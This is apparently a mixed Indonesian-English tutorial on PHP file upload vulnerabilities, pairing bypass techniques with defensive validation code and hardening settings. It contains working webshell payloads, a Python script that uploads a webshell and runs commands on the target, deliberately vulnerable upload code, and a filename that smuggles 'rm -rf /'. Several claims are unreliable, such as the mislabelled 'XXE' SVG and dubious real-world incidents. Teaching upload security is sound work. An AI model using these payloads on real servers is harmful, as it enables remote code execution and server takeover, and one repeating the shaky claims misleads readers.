# File Upload - Unrestricted File Execution

## 🎯 Apa Itu File Upload Vulnerability?

**File Upload** adalah vulnerability dimana attacker dapat upload malicious files ke web server yang kemudian bisa dieksekusi atau diakses. Vulnerability terdeteksi ketika upload validation tidak proper, memungkinkan webshell atau arbitrary code execution.

**Common Impacts:**
- **Web Shell Upload:** Full server control
- **Backdoor Installation:** Persistent access
- **Arbitrary Code Execution:** RCE via uploaded scripts
- **Malware Distribution:** Server becomes distribution point

## 🔬 Cara Kerja File Upload Attacks

### Normal Upload Process
```
Browser → POST /upload.php (multipart/form-data)
Server → PHP handles $_FILES array
Server → Store file di target directory
Response → Success/error message
```

### Vulnerable Code Patterns

#### Minimal Validation (Dangerous)
```php
<?php
// Ultra-vulnerable upload (worst practice)
if($_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $tempPath = $_FILES['file']['tmp_name'];
    $targetPath = 'uploads/' . $_FILES['file']['name'];
    move_uploaded_file($tempPath, $targetPath);
    echo "Upload successful!";
}
```

#### Better But Still Vulnerable
```php
<?php
// Validates extension but not MIME type
$allowed_extensions = ['jpg', 'png', 'gif'];

$filename = $_FILES['file']['name'];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if(in_array($extension, $allowed_extensions)) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$filename");
}
```

## 🏗️ Teknologi Di Balik File Upload

### HTTP Multipart Form-Data
```
Content-Type: multipart/form-data; boundary=----------------------------boundary

------------------------------boundary
Content-Disposition: form-data; name="file"; filename="evil.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------------------------------boundary--
```

### File Storage Mechanisms
- **Local Filesystem:** Direct disk writes
- **Cloud Storage:** S3, Cloudinary, CDN integration
- **Database Storage:** BLOB fields untuk metadata plus file system
- **Memory Storage:** Cache systems (Redis, Memcached)

### PHP File Upload Handling
- `$_FILES` superglobal array structure
- `upload_tmp_dir` configuration
- File size limits (`upload_max_filesize`, `post_max_size`)
- Error constants (UPLOAD_ERR_OK, UPLOAD_ERR_INI_SIZE, etc.)

## 📊 Attack Vectors

### Content-Type Spoofing
```bash
# Change MIME type via proxy
Content-Type: image/jpeg

# Actually upload phar:// archive with PHP code
```

### Extension Bypass Techniques

#### Case Variation Bypass
```bash
# If only checks .jpg, .png
shell.php.JpG   # Windows case-insensitive filesystem
shell.pHp       # Mixed case
```

#### Null Byte Injection
```bash
# Old PHP versions
shell.php%00.jpg  # %00 truncates string at filename processing
```

#### Double Extension Abuse
```bash
# When using strrpos() or pathinfo()
shell.php;rm -rf /;foo.jpg  # Semicolon terminates extension check
shell.php.jar.jpg           # Archive extensions with PHP
```

#### Custom Extension Arrays
```bash
# Server configured wrong
shell.phtml      # Alternative PHP extensions
shell.php3       # Older PHP versions
shell.phtml5     # Experimental extensions
```

### Filename Normalization Issues
```bash
# Apache filename normalization
shell.php.%2e    # URL encoded dot
shell.php%00     # Null byte termination

# Windows 8.3 naming exploits
SHELL~1.PHP      # Short filename equivalent
```

### Archive File Exploits

#### PHAR Archive Execution
```bash
# Create malicious PHAR archive
php -d phar.readonly=0 create_phar.php

# Upload as evil.phar.jpg
# Access via phar:// protocol
http://site.com/uploads/evil.phar.jpg/shell.php
```

#### ZIP Archive Inclusion
```bash
# Zip with webshell
zip evil.zip shell.php

# PHP can read from ZIP wrapper
include('zip://uploads/evil.zip#shell.php');
```

### Directory Traversal Upload
```bash
# Bypass upload directory restrictions
../../../../uploads/shell.php  # Write to any directory
....//....//shell.php           # Alternative traversal
```

## 🛠️ Testing Serangan File Upload

### Upload Points Discovery
1. **Form Inspection:** Check untuk `<input type="file">` elements
2. **API Endpoints:** REST API dengan multipart support
3. **Admin Panels:** Bulk upload features
4. **Profile Images:** User avatar functionality

### Payload Development
```php
// Basic webshell
<?php system($_GET['cmd']); ?>

// Advanced payload
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
    echo "<!-- ".system($_GET['cmd'])." -->";
}
?>

// Image with PHP polyglot
GIF89a;<?php system($_GET['cmd']); ?>
```

### Testing Methodologies

#### Black Box Testing
1. **Upload Common Files:** txt, jpg, png, pdf, zip
2. **Directory Listing:** Check upload directory langsung
3. **View Source:** Look untuk file path leaks
4. **Error Messages:** Enumerate untuk extension restrictions

#### White Box Testing
- Review upload validation code
- Check file permission settings
- Test directory traversal restrictions
- Verify file size limits bypassed

### Automated Testing Tools

#### Burp Suite Professional
1. **Repeater:** Manual payload upload testing
2. **Intruder:** Bulk extension testing (.php, .phtml, double extensions)
3. **CSRF Generation:** Upload form PoC

#### Custom Test Script
```python
#!/usr/bin/env python3
import requests

def test_file_upload(url, filename, content, field_name='file'):
    """Test file upload vulnerabilities"""

    files = {field_name: (filename, content, 'application/octet-stream')}
    response = requests.post(url, files=files)

    # Check if uploaded successfully
    if process_upload_response(response):
        print(f"✅ Potensi vuln untuk {filename}")

        # Try execute webshell
        cmd_url = f"{url.replace('upload.php', 'uploads')}/{filename}?cmd=id"
        shell_response = requests.get(cmd_url)
        if shell_response.status_code == 200:
            print("🚨 WebShell aktif!")
            print(shell_response.text)

def process_upload_response(response):
    """Check upload response for success indicators"""
    success_indicators = [
        "uploaded successfully",
        "file uploaded",
        "saved to",
        "upload complete"
    ]

    return any(indicator in response.text.lower()
              for indicator in success_indicators)

# Usage
if __name__ == "__main__":
    target_url = "http://vulntarget.com/upload.php"

    # Test various payloads
    payloads = [
        ("webshell.php", "<?php system($_GET['cmd']); ?>"),
        ("evil.shell.php.jpg", '<?php echo "Shell active"; ?>'),
        ("test%00.php", "<?php phpinfo(); ?>"),  # Null byte
    ]

    for filename, content in payloads:
        test_file_upload(target_url, filename, content)
```

## 🛡️ Prevention & Mitigation

### Multi-Layer Validation

#### Client-Side Validation (Inadequate Alone)
```javascript
// Client-side check (easily bypassed)
function validateFile(file) {
    var allowed = ['jpg', 'png', 'gif'];
    var ext = file.name.split('.').pop().toLowerCase();
    return allowed.includes(ext);
}
```

#### Server-Side Validation Layers

##### Extension Whitelist (Primary Layer)
```php
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$filename = $_FILES['file']['name'];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (!in_array($extension, $allowed_extensions)) {
    die("Invalid file type");
}
```

##### MIME Type Verification
```php
$mime = mime_content_type($_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($mime, $allowed_mimes)) {
    die("Invalid MIME type");
}
```

##### Content Analysis (Binary Signatures)
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

// File header analysis for images
$content = file_get_contents($_FILES['file']['tmp_name'], false, null, 0, 100);
$headers = [
    'jpeg' => "\xFF\xD8\xFF",
    'png' => "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A",
    'gif' => "GIF",
];

foreach ($headers as $type => $header) {
    if (strpos($content, $header) !== false) {
        $valid = true;
        break;
    }
}
```

### Secure Upload Implementation
```php
// Complete secure upload function
function secure_file_upload($file_input, $upload_dir, $allowed_types) {

    // 1. Check upload errors
    if ($file_input['error'] !== UPLOAD_ERR_OK) {
        throw new Exception("Upload error: " . $file_input['error']);
    }

    // 2. Verify file size
    if ($file_input['size'] > MAX_FILE_SIZE) {
        throw new Exception("File too large");
    }

    // 3. Sanitize filename
    $original_name = basename($file_input['name']);
    $safe_name = preg_replace("/[^a-zA-Z0-9\.\-_]/", "", $original_name);

    // 4. Generate unique filename
    $extension = strtolower(pathinfo($safe_name, PATHINFO_EXTENSION));
    $filename = uniqid('upload_', true) . '.' . $extension;

    // 5. Full security checks
    $content = file_get_contents($file_input['tmp_name']);
    $mime = mime_content_type($file_input['tmp_name']);

    // Extension validation
    if (!in_array($extension, $allowed_types['extensions'])) {
        throw new Exception("Invalid extension");
    }

    // MIME validation
    if (!in_array($mime, $allowed_types['mimes'])) {
        throw new Exception("Invalid MIME type");
    }

    // Content validation (file headers)
    if (strpos($content, $allowed_types['headers'][$extension]) !== 0) {
        throw new Exception("Corrupted file");
    }

    // 6. Secure move to final location
    $full_path = $upload_dir . '/' . $filename;
    if (!move_uploaded_file($file_input['tmp_name'], $full_path)) {
        throw new Exception("Failed to save file");
    }

    return $filename;
}
```

### Server Configuration

#### PHP Hardening
```ini
; Disable dangerous functions
disable_functions = exec,passthru,shell_exec,system,popen,proc_open

; Restrict file upload size
upload_max_filesize = 2M
post_max_size = 8M

; Sandbox uploads
open_basedir = /var/www/html/uploads/
```

#### Directory Permissions
```bash
# Secure upload directory
chown -R www-data:www-data /var/www/uploads/
chmod 755 /var/www/uploads/
find /var/www/uploads/ -type f -exec chmod 644 {} \;
```

#### Apache .htaccess Protect
```apache
# Disable script execution in uploads
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    <RequireAll>
        Require all denied
    </RequireAll>
</FilesMatch>
```

## 🔍 Real-World Examples

### 2012: Zeitgeist Framework RCE
- Unrestricted file upload di Python apps
- Led to arbitrary code execution
- Fixed dengan input validation

### 2017: Concrete5 CMS Upload Bypass
- MIME type spoofing allowed PHP execution
- Millions CMS installations affected
- Fixed dengan proper validation

### 2020: WordPress Plugin Vulnerabilities
- File upload restrictions bypassed regularly
- Theme/plugin directory traversal exploits
- Community fixes released timely

### 2021: Microsoft Exchange Zero-Days
- File write vulnerabilities via upload features
- Used untuk webshell deployment
- Multiple Proxyshell vulnerabilities

## 📈 Advanced Upload Attacks

### Web Assembly (WASM) Upload
- Compile C/C++ code to WASM
- Upload sebagai trusted files
- Execute browser-side attacks

### Polyglot File Creation
```bash
# File yang valid sebagai JPG dan executable PHP
printf "\xff\xd8\xff\xe0<?php \nphpinfo();\n?>" > mixed.jpg
```

### Unicode Filename Attacks
```bash
# Right-to-left override tricks
# \u202E (right-to-left override) + fake extension
# Display as: shell.pdf but actual: shell.php
```

### Server-Side Processing Exploitation
```python
# Upload SVG with XXE payload
<svg xmlns="http://www.w3.org/2000/svg">
<image xlink:href="http://internal.com/secret.txt"/>
</svg>
```

## 🎯 Testing Framework

### Systematic Upload Security Audit
1. **Input Vector Mapping:** All file upload endpoints
2. **Filter Analysis:** MIME checks, extension validation, size limits
3. **Directory Testing:** Upload location, permission settings
4. **Execution Testing:** Web directory, script execution capabilities
5. **Traversal Testing:** Path normalization, backslash attacks

### Security Configuration Review
- File type restrictions effective?
- Upload directory isolated?
- File permissions restrictive?
- Server hardening implemented?

### Cross-Functional Testing
- Integration with CDN/storage services
- Cloud upload restrictions
- Multi-file upload handling
- Upload queue/processing features

### Reporting Template
```
# Vulnerability: Unrestricted File Upload → WebShell
# URL: /upload.php (POST)
# Parameter: file (multipart)
# Payload: webshell.php (PHP backdoor)
# Access: /uploads/webshell.php?cmd=id
# Impact: Remote code execution, server takeover
# CVSS: 9.8 (Critical)
# Fix: Multi-layer validation + execution prevention
```

## 📚 Resources

- **OWASP File Upload:** https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- **PayloadsAllTheThings:** File upload bypass payloads
- **InsiderPHD:** Advanced Windows upload tricks
- **HackerNews Study:** Most common upload bypasses

---

**File upload often overlooked tapi critical.** Single webshell upload = full compromise. Defense requires impossible-to-bypass validation layers. Master extension + MIME + content checks. 🔓💣
